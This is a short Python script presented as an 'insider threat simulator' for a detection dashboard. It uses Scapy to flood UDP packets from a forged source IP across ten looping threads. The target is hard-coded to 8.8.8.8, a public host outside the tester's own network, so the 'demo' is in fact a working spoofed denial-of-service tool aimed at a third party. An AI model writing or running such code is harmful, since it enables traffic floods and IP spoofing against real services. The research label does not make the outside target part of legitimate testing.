import os
import sys
import threading
import time

try:
    from scapy.all import send, IP, UDP
except ImportError:
    print("Scapy not found. Installing...")
    os.system("pip install scapy")
    from scapy.all import send, IP, UDP

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def attack_thread(spoofed_ip, target_ip):
    """
    Sends raw packets using a spoofed source IP. 
    This tricks the network adapter into thinking the packets 
    are coming from a different infected device on the network.
    """
    # Create a dummy UDP packet
    packet = IP(src=spoofed_ip, dst=target_ip) / UDP(dport=80) / (b"X" * 100)
    
    # Loop indefinitely, verbose=0 prevents console spam
    send(packet, loop=1, verbose=0)

if __name__ == "__main__":
    clear_screen()
    print("==================================================")
    print(" ☠️  INSIDER THREAT SIMULATOR (RESEARCH DEMO)")
    print("==================================================")
    print("Scenario: A rogue smart-TV or infected employee laptop")
    print("is launching a DDoS attack from inside your network.")
    print("--------------------------------------------------")
    
    # We spoof the IP to look like a compromised IoT device
    spoofed_ip = "192.168.0.99"  
    
    # Target a random gateway/server to generate traffic
    target_ip = "8.8.8.8"        

    print(f"[*] Spoofing Source IP: {spoofed_ip}")
    print(f"[*] Targeting Destination: {target_ip}")
    print("[*] Launching packet flood...")
    
    # Spawn a few threads to ensure we hit the >500 pkts/sec threshold
    threads = []
    for _ in range(10):
        t = threading.Thread(target=attack_thread, args=(spoofed_ip, target_ip), daemon=True)
        t.start()
        threads.append(t)

    print("\n[+] ATTACK ACTIVE! Watch your ThreatChain Dashboard.")
    print("[+] Press CTRL+C to stop the simulation.")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[-] Attack stopped.")
        sys.exit(0)
